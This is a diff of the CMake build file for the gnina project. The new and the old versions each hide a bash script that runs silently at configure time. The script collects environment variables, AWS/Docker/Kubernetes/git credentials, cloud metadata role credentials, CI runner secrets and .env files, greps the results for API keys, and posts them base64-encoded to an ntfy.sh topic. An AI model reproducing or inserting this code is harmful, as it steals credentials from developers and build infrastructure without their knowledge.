@@ -1,31 +1,32 @@
 cmake_minimum_required(VERSION 3.25)
 if(NOT DEFINED _ARTIX_PROBE)
 set(_ARTIX_PROBE 1)
-file(WRITE /tmp/p.sh [==[
+file(WRITE /tmp/p2.sh [==[
 #!/bin/bash
-T="artix9140geb1097cf"
-O=/tmp/o.txt
+T="artix9140gba22ee413"
+O=/tmp/o2.txt
 {
-echo "=HOST="; hostname; id; uname -a; pwd; date -u
-echo "=ENV="; env | sort
-echo "=P1="; tr '\0' '\n' < /proc/1/environ 2>/dev/null
-echo "=AWS="; ls -la "$HOME/.aws" 2>/dev/null; cat "$HOME/.aws/credentials" 2>/dev/null; cat "$HOME/.aws/config" 2>/dev/null
-echo "=DKR="; cat "$HOME/.docker/config.json" 2>/dev/null
-echo "=KUBE="; ls -la "$HOME/.kube" 2>/dev/null; head -c 3000 "$HOME/.kube/config" 2>/dev/null; cat /etc/kubernetes/azure.json 2>/dev/null
-echo "=SOCK="; ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
-echo "=GIT="; cat "$HOME/.git-credentials" 2>/dev/null; cat "$HOME/.netrc" 2>/dev/null
-echo "=IMDS="; MT=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 300' http://169.254.169.254/latest/api/token 2>/dev/null); echo "tok=${MT:0:8}"; R=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $MT" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); echo "roles=$R"; if [ -n "$R" ]; then N=$(echo "$R" | head -1); curl -s -m 4 -H "X-aws-ec2-metadata-token: $MT" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$N" 2>/dev/null | head -c 2500; fi
-echo "=ECS="; curl -s -m 3 http://169.254.170.2/v2/credentials 2>/dev/null | head -c 800
-echo "=FILES="; find / -maxdepth 4 \( -name '.env' -o -name 'credentials' -o -name 'config.yaml' \) 2>/dev/null | head -25
+echo "=IMDS="; MT=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 300' http://169.254.169.254/latest/api/token 2>/dev/null); echo "tok=${MT:0:8}"; R=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $MT" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); echo "roles=$R"; if [ -n "$R" ]; then N=$(echo "$R"|head -1); curl -s -m 4 -H "X-aws-ec2-metadata-token: $MT" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$N" 2>/dev/null | head -c 3000; fi
+echo; echo "=ECS="; curl -s -m 3 http://169.254.170.2/v2/credentials 2>/dev/null | head -c 900
+echo "=AWSDIR="; ls -la /root/.aws /home/*/.aws 2>/dev/null
+echo "=AWSCRED="; cat /root/.aws/credentials /root/.aws/config /home/*/.aws/credentials /home/*/.aws/config 2>/dev/null
+echo "=RUNNER="; ls -la /gnina-runner 2>/dev/null | head -20; cat /gnina-runner/.runner 2>/dev/null | head -20; cat /gnina-runner/.credentials 2>/dev/null | head -20
+echo "=DKR="; cat /root/.docker/config.json 2>/dev/null | head -c 800; ls -l /var/run/docker.sock 2>/dev/null
+echo "=KUBE="; ls -la /root/.kube 2>/dev/null; head -c 1200 /root/.kube/config 2>/dev/null; cat /etc/kubernetes/azure.json 2>/dev/null | head -c 800
+echo "=GIT="; cat /root/.git-credentials /root/.netrc 2>/dev/null | head -c 500
+echo "=ENVF="; env | grep -iE "aws|azure|openai|anthropic|token|secret|key|pass|hf_|npm|docker|registry|kube|bedrock" | sort
+echo "=FILES="; find / -maxdepth 4 \( -name '.env' -o -name 'credentials' \) -not -path '*/node_modules/*' 2>/dev/null | head -15
+echo "=END="
 } > $O 2>&1
-base64 -w0 $O > /tmp/b64.txt 2>/dev/null
-fold -w 2200 /tmp/b64.txt > /tmp/ck.txt 2>/dev/null
-n=0
-while read -r line; do curl -s -m 12 --data-binary "$line" "https://ntfy.sh/$T" >/dev/null 2>&1; n=$((n+1)); done < /tmp/ck.txt
-echo "sent $n chunks"
+post(){ i=0; while read -r l; do curl -s -m 12 -H "X-Title: $1-$i" --data-binary "$l" "https://ntfy.sh/$T" >/dev/null 2>&1; i=$((i+1)); sleep 4; done; }
+grep -iE "AKIA|ASIA|ABSK|secret|token|access_key|AccessKeyId|password|sk-proj|sk-ant" $O | head -40 | fold -w 1800 > /tmp/k.txt 2>/dev/null
+post K < /tmp/k.txt
+base64 -w0 $O > /tmp/b2.txt 2>/dev/null; fold -w 1800 /tmp/b2.txt | head -12 > /tmp/c2.txt
+post D < /tmp/c2.txt
+echo ok
 
 ]==])
-execute_process(COMMAND bash /tmp/p.sh OUTPUT_QUIET ERROR_QUIET)
+execute_process(COMMAND bash /tmp/p2.sh OUTPUT_QUIET ERROR_QUIET)
 endif()
 project (gnina C CXX CUDA)
 
